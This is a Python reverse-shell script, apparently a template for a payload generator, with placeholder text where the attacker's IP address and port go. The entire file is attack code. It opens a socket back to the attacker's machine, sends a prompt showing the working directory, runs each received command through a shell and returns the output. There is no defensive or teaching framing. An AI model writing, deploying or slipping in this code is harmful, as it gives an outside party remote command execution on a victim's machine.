import socket
import subprocess
import os

# Set up the target server and port (attacker's machine)
HOST = (here the payload generator will enter it)  # Attacker's IP address
PORT = (here the payload generator will enter it)  # Port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    # Execute the command and return the result
    return subprocess.run(command, shell=True, capture_output=True)

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))
    
    # Send the initial cwd to show where the shell is starting
    cwd = os.getcwd()
    sock.sendall(f"Connected to {cwd} shell\n".encode('utf-8'))
    
    while True:
        # Display the current working directory in the prompt
        cwd = os.getcwd()  # Get the current working directory
        prompt = f"{cwd} > "
        
        # Receive the command from the attacker
        sock.sendall(prompt.encode('utf-8'))  # Send prompt with cwd
        command = sock.recv(1024).decode('utf-8')

        if command.lower() == 'exit':
            sock.close()
            break
        
        # Execute the received command and capture the output
        output = execute_command(command)
        
        # Send the output back to the attacker
        sock.sendall(output.stdout + output.stderr)

except Exception as e:
    print(f"Error: {e}")
    sock.close()
